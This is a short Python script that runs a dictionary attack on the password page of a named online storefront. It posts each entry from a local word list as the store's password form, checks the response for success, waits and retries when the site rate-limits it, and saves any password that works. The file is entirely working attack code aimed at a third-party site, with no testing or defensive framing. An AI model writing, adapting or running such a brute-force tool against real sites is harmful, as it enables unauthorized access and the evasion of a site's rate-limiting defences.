from bs4 import BeautifulSoup as Soup
import requests
import time

target_site = 'https://l00sechange.com/password'
possible_passwords = []
password_index = 0
found_password = False
seconds_to_retry = 5


def load_passwords():
    global possible_passwords

    file = open('passwords.txt', 'r')
    possible_passwords = file.readlines()
    file.close()


def begin_loop():
    global found_password

    load_passwords()

    while not found_password:
        password_to_try = str(possible_passwords[password_index]).rstrip()

        if attempt_password(password_to_try):
            print('Found password!')

            file = open('found_password.txt', 'w')
            file.write(password_to_try)
            file.close()

            found_password = True
        else:
            print(f'Didn\'t find password, retrying in {seconds_to_retry} seconds...')
            time.sleep(seconds_to_retry)


def attempt_password(password):
    global seconds_to_retry
    global password_index

    print('Attempting to use password "' + password + '"')

    data = {
        'form_type': 'storefront_password',
        'utf8': '✓',
        'password': password,
        'commit': ''
    }

    session = requests.post(target_site, data=data)

    document = Soup(session.content, 'html.parser')

    if document.find('div', class_='errors') is None:
        if document.find('h3').text == 'What happened?':
            print('⚠ Rate limited ⚠')
            seconds_to_retry = 60
            return False

        return True
    else:
        password_index += 1

        if password_index == len(possible_passwords):
            print('Reached the end of password list.')
            exit(1)
        return False


begin_loop()
